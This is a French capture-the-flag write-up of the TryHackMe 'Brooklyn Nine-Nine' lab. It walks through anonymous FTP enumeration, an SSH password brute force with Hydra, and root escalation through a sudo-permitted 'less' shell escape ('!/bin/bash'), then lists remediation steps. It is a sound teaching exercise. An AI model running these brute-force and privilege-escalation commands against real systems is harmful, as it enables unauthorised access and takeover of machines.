# 🕵️‍♂️ TryHackMe — Brooklyn Nine-Nine

## 🎯 Objectif
Compromettre la machine et obtenir les flags user et root.

---

## 🔍 Reconnaissance

Scan de la machine avec Nmap :

```bash
nmap -sV -sC 10.130.160.77
```

### 📊 Résultats

- **21/tcp** → FTP (anonymous login allowed)
- **22/tcp** → SSH
- **80/tcp** → HTTP

---

## 🔓 Accès initial (FTP)

Connexion au service FTP :

```bash
ftp 10.130.160.77
```

Login :

```text
anonymous
```

Fichier trouvé :

```text
note_to_jake.txt
```

Contenu du fichier :

```text
From Amy,
Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

### 🧠 Analyse

- utilisateur identifié : **jake**
- mot de passe faible → vulnérable au brute force

---

## 💣 Bruteforce SSH

Attaque avec Hydra et la wordlist rockyou :

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.130.160.77
```

### 🔑 Résultat

```text
login: jake
password: 987654321
```

---

## 🔐 Accès SSH

Connexion avec les identifiants trouvés :

```bash
ssh jake@10.130.160.77
```

Mot de passe :

```text
987654321
```

---

## 👑 Privilege Escalation

Vérification des droits sudo :

```bash
sudo -l
```

### 📊 Résultat

```text
(ALL) NOPASSWD: /usr/bin/less
```

Cela signifie que l’utilisateur peut exécuter `less` en tant que root sans mot de passe.

---

## 🧨 Exploitation

Lancement de less en root :

```bash
sudo less /etc/passwd
```

Dans l’interface de `less`, exécution d’un shell :

```text
!/bin/bash
```

### 💥 Résultat

Obtention d’un shell root :

```bash
root@brooklyn_nine_nine:~#
```

---

## 🎯 Récupération des flags

### 👤 User flag

Recherche du fichier :

```bash
find / -name "user.txt" 2>/dev/null
```

Résultat :

```text
/home/holt/user.txt
```

Lecture :

```bash
cat /home/holt/user.txt
```

---

### 👑 Root flag

```bash
cat /root/root.txt
```

---

## 🧠 Explication de la faille

Le programme `less` permet d’exécuter des commandes système avec `!`.

Lorsqu’il est lancé avec `sudo`, ces commandes sont exécutées avec les privilèges root.

Ainsi :
- `sudo less` → exécution en root
- `!/bin/bash` → ouverture d’un shell
- résultat → shell root

---

## ⚠️ Vulnérabilités exploitées

- FTP anonyme activé → fuite d’information  
- mot de passe faible → vulnérable au brute force  
- mauvaise configuration sudo → élévation de privilèges  

---

## 🔥 Compétences acquises

- Nmap (scan réseau)
- Énumération FTP
- Bruteforce avec Hydra
- Connexion SSH
- Recherche de fichiers (find)
- Privilege escalation (sudo + less)

---

## ✅ Conclusion

Cette machine illustre une chaîne d’attaque classique :

1. reconnaissance des services
2. exploitation d’un accès FTP anonyme
3. brute force d’un mot de passe faible
4. exploitation d’une mauvaise configuration sudo
5. obtention des privilèges root

---

## 🚀 Améliorations possibles (sécurité)

- désactiver l’accès FTP anonyme
- imposer des mots de passe forts
- limiter les tentatives SSH (fail2ban)
- restreindre les permissions sudo
